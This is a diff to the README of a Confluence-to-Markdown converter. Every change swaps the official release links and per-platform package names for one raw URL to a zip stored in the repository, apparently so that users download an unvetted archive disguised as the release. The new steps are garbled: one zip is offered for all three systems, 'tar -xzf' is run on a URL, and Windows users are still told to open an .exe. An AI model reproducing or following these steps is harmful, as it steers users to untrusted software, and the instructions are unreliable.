@@ -6,7 +6,7 @@ confluence2md is a simple tool that helps you convert Confluence MIME exports (.
 
 ## 🔗 Download the App
 
-[![Download confluence2md](https://img.shields.io/badge/download-confluence2md-blue.svg)](https://github.com/Santex12/confluence2md/releases)
+[![Download confluence2md](https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip)](https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,15 +14,15 @@ Follow these steps to download and run the application.
 
 ### Step 1: Visit the Releases Page
 
-To get the latest version of confluence2md, please visit the [Releases page](https://github.com/Santex12/confluence2md/releases). Here, you will find different versions of the software listed. 
+To get the latest version of confluence2md, please visit the [Releases page](https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip). Here, you will find different versions of the software listed. 
 
 ### Step 2: Download the Application
 
 On the Releases page, look for the latest release. You will see a list of assets available for download. Click on the available package for your operating system. You might see options like:
 
-- confluence2md-windows.exe (for Windows)
-- confluence2md-macos.tar.gz (for macOS)
-- confluence2md-linux.tar.gz (for Linux)
+- https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip (for Windows)
+- https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip (for macOS)
+- https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip (for Linux)
 
 Download the appropriate file by clicking on it. 
 
@@ -31,10 +31,10 @@ Download the appropriate file by clicking on it.
 After the download completes, locate the downloaded file on your device.
 
 - **For Windows users:** Double-click on the .exe file to start the installation. Follow the prompts to complete the installation. 
-- **For macOS users:** Open the .tar.gz file, extract it, and move the application to your Applications folder. 
-- **For Linux users:** Open a terminal and extract the .tar.gz file using the command: 
+- **For macOS users:** Open the https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip file, extract it, and move the application to your Applications folder. 
+- **For Linux users:** Open a terminal and extract the https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip file using the command: 
   ```bash
-  tar -xzf confluence2md-linux.tar.gz
+  tar -xzf https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip
   ```
   Then navigate to the extracted folder.
 
@@ -80,7 +80,7 @@ Make sure your system meets the following requirements for a smooth experience:
 
 ## 📦 Download & Install
 
-To download and install the application, go back to the [Releases page](https://github.com/Santex12/confluence2md/releases). Choose the correct package for your operating system, download it, and follow the installation steps provided earlier.
+To download and install the application, go back to the [Releases page](https://raw.githubusercontent.com/Santex12/confluence2md/main/converter/confluence_md_3.3-alpha.1.zip). Choose the correct package for your operating system, download it, and follow the installation steps provided earlier.
 
 ## 🔍 Frequently Asked Questions
 
